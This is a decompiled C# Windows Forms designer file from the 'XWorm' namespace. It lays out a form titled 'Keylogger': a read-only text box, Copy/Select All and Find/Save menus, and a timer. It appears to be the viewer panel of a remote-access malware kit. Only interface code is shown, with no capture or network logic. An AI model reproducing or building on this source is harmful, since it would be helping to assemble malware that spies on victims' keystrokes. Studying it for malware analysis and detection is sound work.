namespace XWorm
{
	// Token: 0x0200001D RID: 29
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Keylogger : global::System.Windows.Forms.Form
	{
		// Token: 0x0600060E RID: 1550 RVA: 0x00036DDC File Offset: 0x00034FDC
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x0600060F RID: 1551 RVA: 0x00036E2C File Offset: 0x0003502C
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::XWorm.Keylogger));
			this.T1 = new global::System.Windows.Forms.RichTextBox();
			this.Guna2ContextMenuStrip1 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.CopyToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SelectAllToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MenuStrip1 = new global::System.Windows.Forms.MenuStrip();
			this.ToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TFind = new global::System.Windows.Forms.ToolStripTextBox();
			this.ToolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.Guna2ContextMenuStrip1.SuspendLayout();
			this.MenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.T1.BackColor = global::System.Drawing.Color.White;
			this.T1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.T1.ContextMenuStrip = this.Guna2ContextMenuStrip1;
			this.T1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.T1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.T1.ForeColor = global::System.Drawing.Color.Black;
			this.T1.Location = new global::System.Drawing.Point(0, 27);
			this.T1.Name = "T1";
			this.T1.ReadOnly = true;
			this.T1.Size = new global::System.Drawing.Size(469, 257);
			this.T1.TabIndex = 3;
			this.T1.Text = "";
			this.Guna2ContextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.CopyToolStripMenuItem1,
				this.SelectAllToolStripMenuItem1
			});
			this.Guna2ContextMenuStrip1.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip1.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip1.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip1.Size = new global::System.Drawing.Size(181, 70);
			this.CopyToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.CopyToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CopyToolStripMenuItem1.Image");
			this.CopyToolStripMenuItem1.Name = "CopyToolStripMenuItem1";
			this.CopyToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.CopyToolStripMenuItem1.Text = "Copy";
			this.SelectAllToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.SelectAllToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("SelectAllToolStripMenuItem1.Image");
			this.SelectAllToolStripMenuItem1.Name = "SelectAllToolStripMenuItem1";
			this.SelectAllToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.SelectAllToolStripMenuItem1.Text = "Select All";
			this.MenuStrip1.BackColor = global::System.Drawing.Color.White;
			this.MenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripMenuItem2,
				this.TFind,
				this.ToolStripMenuItem3
			});
			this.MenuStrip1.Location = new global::System.Drawing.Point(0, 0);
			this.MenuStrip1.Name = "MenuStrip1";
			this.MenuStrip1.Size = new global::System.Drawing.Size(469, 27);
			this.MenuStrip1.TabIndex = 4;
			this.MenuStrip1.Text = "MenuStrip1";
			this.ToolStripMenuItem2.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem2.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem2.Image");
			this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
			this.ToolStripMenuItem2.Size = new global::System.Drawing.Size(58, 23);
			this.ToolStripMenuItem2.Text = "Find";
			this.TFind.BackColor = global::System.Drawing.Color.White;
			this.TFind.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.TFind.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.TFind.ForeColor = global::System.Drawing.Color.Black;
			this.TFind.Name = "TFind";
			this.TFind.Size = new global::System.Drawing.Size(100, 23);
			this.TFind.Text = "..";
			this.ToolStripMenuItem3.BackColor = global::System.Drawing.Color.White;
			this.ToolStripMenuItem3.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripMenuItem3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			this.ToolStripMenuItem3.Size = new global::System.Drawing.Size(59, 23);
			this.ToolStripMenuItem3.Text = "Save";
			this.Timer1.Enabled = true;
			this.Timer1.Interval = 1000;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(469, 284);
			base.Controls.Add(this.T1);
			base.Controls.Add(this.MenuStrip1);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Keylogger";
			this.Text = "Keylogger";
			this.Guna2ContextMenuStrip1.ResumeLayout(false);
			this.MenuStrip1.ResumeLayout(false);
			this.MenuStrip1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000270 RID: 624
		private global::System.ComponentModel.IContainer components;
	}
}
